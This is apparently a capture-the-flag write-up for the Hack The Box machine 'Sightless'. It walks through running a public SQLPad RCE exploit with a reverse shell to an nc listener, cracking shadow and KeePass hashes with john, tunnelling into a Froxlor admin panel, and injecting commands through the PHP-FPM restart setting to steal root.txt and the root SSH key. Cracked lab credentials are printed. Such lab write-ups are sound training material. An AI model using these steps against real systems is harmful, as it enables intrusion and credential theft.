
First we're going to do a scan on the Internet to see what ports are open.

![image-20241230-202410.png](73859193.png)

Then I started adding the domainname to the /etc/hosts file. This allowed us to go on the web browser to the web page http://sightless.htb

![image-20241230-202446.png](74416228.png)

On this web page, we see 2 different things that might be of interest.

![image-20241230-202146.png](73891974.png)

At the first picture we can find the about button in the upper right corner this will say on which version sqlpad is hosted.

![image-20241230-202122.png](73891968.png)

Then I started looking for an exploit for the version of sqlpad.

[https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)

By using the following command we can start contacting the root user of the sqlpad.

On the first shell we are going to put the following commado:

```
python3 exploit.py http://sqlpad.sightless.htb 10.10.14.39 4444
```

On a second shell we are going to set the listener. We will do this using the following command:

```
nc -lvp 4444
```

![image-20241230-202719.png](74416236.png)

If we take a look at the shadow file, we can see that some passwords have been hashed. We will retrieve them using john or hashcat. To do this we need to store the hashes in a separate file on our normal machine and then we can use the following command to retrieve the passwords.

```
john --wordlist=/usr/share/wordlists/rockyou.txt <file waar de hashes in staan>
```

There you can see that the user michael has the following password.

![image-20241230-203151.png](73891985.png)

We can now start making an ssh connection using the following user credentials:

| Username | Password         |
| -------- | ---------------- |
| Michael  | insaneclownposse |

If we are going to use the ls command in the ssh connection, we are going to see our first flag. We're going to be able to see it by using the cat command.

Here we have the first flag.

![[Pasted image 20250122142508.png]]

If we will look at the /etc/hosts file in this user, we will see that the there is an ip address “127.0.0.1”. By using linpeas I have seen that the port 8080 is used to host the admin login page of froxlor

![image-20241230-203233.png](74416243.png)

So we are going to log out on the ssh connection and start a new connection where .... . We will start doing this using the following command:

```
ssh michael@sightless.htb -L 127.0.0.1:8080:127.0.0.1:8080 
```

![image-20241230-203304.png](72646728.png)

So if we will check after on our web browser and we will look for that ip address, you will see that we will see the admin login page from froxlor.

![image-20241230-193459.png](73891895.png)

To find the login credentials we will have to start using the debugger. There we can see that we are shown the following credentials:

| Username | Password        |
| -------- | --------------- |
| admin    | ForlorforxAdmin |

From here we can give certain commands. For example, we can say that since we are logged in as administrator, we copy the root.txt file to the tmp folder of the user michael. The same for the id_rsa file. We will need this to see the root.txt file or to log in as user root via an ssh connection.

How do we tell him to copy the root.txt file to the user michael?

We will do this by navigating in the admin login page to the PHP in the sidebar and selecting PHP-FPM versions.

![image-20241230-194249.png](72646702.png)

then we get the following.

![image-20241230-194411.png](74416189.png)

If we click there on the right hand side we can start to modify the configuration. Then you can go there at the php-fpm restart command to include the command.

![image-20241230-194334.png](73891903.png)

Before the command comes through to the user michael we will have to push it through by doing the following.

Go to System → Settings → PHP-FPM

![image-20241230-195056.png](73859162.png)

There we will have to go the Enable php-fpm turn this off for a few seconds, then turn it back on and click save.

![image-20241230-195209.png](74416199.png)

Should this option not work for the rsa: For example you can see the rsa within the user michael but you cannot open the file because you do not have permissions then you can also do it the following way.

Go to Resources → Customers and you will see the user john there.

![image-20241230-195433.png](74416206.png)

You can go there and change the user's password. I used the following credentials:

These will be the credentials for ftp server:

| Username | Password  |
| -------- | --------- |
| web1     | Password1 |

Using this data, we are going to run the following command:

```
lftp -u web1 sightless.htb 
Password: Password1
```

![image-20241230-195742.png](73891914.png)

We will first have to disable the ssl cert otherwise this will cause problems and it will say that the certificate is not correct. We will do this using the following command:

```
set ssl:verify-certificate off
```

Then we can start looking through the directories and we will eventually see a file Database.kdb. We will start downloading this to our own machine so we can start converting it to a hash and then finally crack it with john.

![image-20241230-200209.png](73891923.png)

We are going to do this using the following commands (This is after downloading and thus happens on our own machine)

```
keepass2john Database.kdb > hash <dit is een naamgeving dat we geven, zodat we het password kunnen gaan cracken>
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt <file waar de hashes in staan>
```

![image-20241230-200516.png](73859174.png)![image-20241230-200547.png](73891933.png)

This is the password we will be using to log into the database. We will be using KeePass for this purpose. We will first have to start downloading this on our machines. We will do this using the following command:

```
sudo apt-get install keepassxc
```

1 once installed we can start opening keepass using the following command.

```
keepassxc Database.kdb
```

Thenm we have to enter the password and we get to this page.

![image-20241230-200906.png](73859180.png)

Here we can see an id_rsa. We will go open this and we can go save it on michael's ssh connection. we will do this using the following command:

```
nano id_rsa_test
```

![image-20241230-201113.png](73891940.png)![image-20241230-201217.png](72646714.png)

Using this id_rsa_test file we can start connecting to the root user. We will do this using the following command:

```
ssh -i id_rsa_test root@10.129.83.162
```

First I got the following error message

![image-20241230-201421.png](73891947.png)

I solved this by executing the command

```
chmod 600 id_rsa_test
```

if we will now try to make the connection you will see that you can now connect to the root user.

![image-20241230-201602.png](73891955.png)

So now we have the 2nd flag and so we did this machine completely.

![[Pasted image 20250122142731.png]]

![image-20241230-203532.png](72646735.png)
